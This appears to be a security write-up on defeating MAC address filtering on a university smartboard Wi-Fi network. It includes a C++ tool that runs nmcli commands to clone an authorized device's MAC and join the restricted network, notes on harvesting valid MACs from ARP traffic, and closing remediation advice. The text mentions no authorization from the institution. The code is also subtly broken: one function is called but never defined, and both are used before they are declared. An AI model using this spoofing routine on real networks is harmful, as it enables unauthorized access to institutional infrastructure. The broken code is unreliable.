College Wi-Fi Security Research: Evaluating MAC-Based Access Controls

An investigation into campus network access control mechanisms, examining the security limitations of MAC address filtering in enterprise wireless environments.

Disclaimer: This research was conducted for educational and defensive assessment purposes. All network pre-shared keys, SSIDs, and physical MAC addresses have been redacted to protect institutional infrastructure.

1. Network Architecture and Context

Campus network environments often segment wireless traffic across distinct Service Set Identifiers (SSIDs) to isolate user groups and internal systems. In our university environment, two parallel networks were deployed: a standard network for general student use with restrictive outbound policies, and a dedicated network reserved for classroom presentation displays and interactive smartboards.

While dedicated infrastructure networks often require high availability and uninterrupted connectivity for teaching tools, their security posture depends heavily on the robustness of their access control boundaries.

2. Investigating Access Control Boundaries

Initial inspection of the smartboard network showed that devices connected using standard WPA2-PSK authentication. However, attempting to authenticate standard personal devices using the pre-shared passphrase consistently failed at the association phase.

This indicated that an additional layer of access control was enforced beyond basic WPA2 pre-shared keys. Analyzing the access control mechanism revealed that the access points utilized Layer 2 Media Access Control (MAC) address whitelisting, permitting only pre-approved hardware identifiers to associate with the network.

While MAC filtering is sometimes deployed as a quick access-control measure, it possesses well-documented architectural weaknesses in wireless security models:

  • Unencrypted Headers: IEEE 802.11 frame headers transmit Layer 2 source and destination MAC addresses in plaintext over the air, visible to any nearby receiver.
  • Hardware Identifier Malleability: Modern network operating systems natively support configuring arbitrary MAC addresses on network interfaces.
  • Absence of Cryptographic Verification: MAC filtering verifies only an asserted identifier without cryptographic proof of identity.

3. Technical Implementation & Cross-Platform Automation

To evaluate how the network enforced its hardware identification whitelist, I developed a proof-of-concept C++ utility to automate interface reconfiguration and connection testing across both Linux and Windows environments: 

#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <array>

std::string os = "linux";

std::string run(std::string command) {
    std::array<char, 128> buffer;
    std::string output;
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) return "Failed to run command: " + command;
    while (fgets(buffer.data(), buffer.size(), pipe)) {
        output += buffer.data();
    }
    pclose(pipe);
    if (!output.empty() && output.back() == '\n')
        output.pop_back();
    return output;
}

int main(int argc, char const *argv[]) {
    std::cout << "[ *] Testing Tool Initialized..." << std::endl;

    if (!std::filesystem::exists("/etc/passwd"))
        os = "windows";

    std::cout << (os == "linux"
        ? "[ *] Detected Environment: Linux"
        : "[ *] Detected Environment: Windows") << std::endl;

    if (os == "linux") connect_linux();
    else connect_windows();

    return 0;
}

void connect_linux() {
    std::cout << "[ *] Scanning for campus access point..." << std::endl;

    if (run("nmcli device wifi list | grep \"[CAMPUS_SMARTBOARD_SSID]\"") == "") {
        std::cout << "[ *] Connection failed: Target AP not detected." << std::endl;
        exit(1);
    }

    std::cout << "[ *] Access point verified. Configuring connection profile..." << std::endl;
    run("nmcli connection delete \"CAMPUS-INFRA\"");
    run("nmcli connection add type wifi ifname wlp2s0 con-name \"CAMPUS-INFRA\" ssid \"[CAMPUS_SMARTBOARD_SSID]\"");
    run("nmcli connection modify \"CAMPUS-INFRA\" wifi-sec.key-mgmt wpa-psk");
    run("nmcli connection modify \"CAMPUS-INFRA\" wifi-sec.psk \"[REDACTED_PSK]\"");

    std::cout << "[ *] Applying cloned MAC address configuration..." << std::endl;
    run("nmcli connection modify \"CAMPUS-INFRA\" 802-11-wireless.cloned-mac-address 84:5C:F3:XX:XX:XX");
    run("nmcli connection modify \"CAMPUS-INFRA\" 802-11-wireless.mac-address-blacklist \"\"");

    std::cout << "[ *] Associating with network..." << std::endl;
    run("nmcli connection up \"CAMPUS-INFRA\"");
    std::cout << "[ *] Association complete." << std::endl;
}

4. Observations in Testing

Layer 2 Contention and Concurrency Effects

Upon configuring the interface with a valid MAC address from an authorized smartboard, the access point immediately permitted network association and assigned an IP address via DHCP.

However, testing highlighted a critical operational challenge inherent to MAC spoofing: Layer 2 address collisions. When two active devices assert the same MAC address simultaneously within the same broadcast domain:

  • Switch CAM tables and access point bridge tables experience MAC address flapping.
  • ARP responses produce conflicting cache entries across neighboring hosts and default gateways.
  • Frames intended for one device are intermittently delivered to the other, leading to high packet loss and session termination.

Passive analysis of the local subnet traffic revealed that broadcast ARP requests constantly expose active MAC addresses of legitimate devices on the network: 

00:87:31:XX:XX:XX
5c:e4:2a:XX:XX:XX
48:9e:bd:XX:XX:XX
... (additional entries redacted)

This observation demonstrates that an attacker can easily harvest a pool of authorized MAC addresses by passively monitoring broadcast traffic, selecting inactive devices to avoid address contention.

5. Security Implications and Remediation

This research highlights why MAC address filtering should not be considered a viable access-control boundary. Because MAC addresses are broadcast in plaintext and trivially spoofed, filtering offers negligible security against an adversary equipped with basic networking utilities.

Recommended Enterprise Mitigations

  • IEEE 802.1X (WPA2/WPA3-Enterprise): Replace pre-shared keys and MAC whitelisting with enterprise authentication (such as EAP-TLS using device certificates or PEAP-MSCHAPv2), cryptographically verifying device or user identity.
  • Network Access Control (NAC): Deploy dedicated NAC solutions capable of dynamic endpoint profiling and posture assessment rather than relying solely on Layer 2 headers.
  • VLAN Segmentation and Isolation: Enforce strict client isolation and micro-segmentation to prevent lateral movement and packet eavesdropping across endpoints.
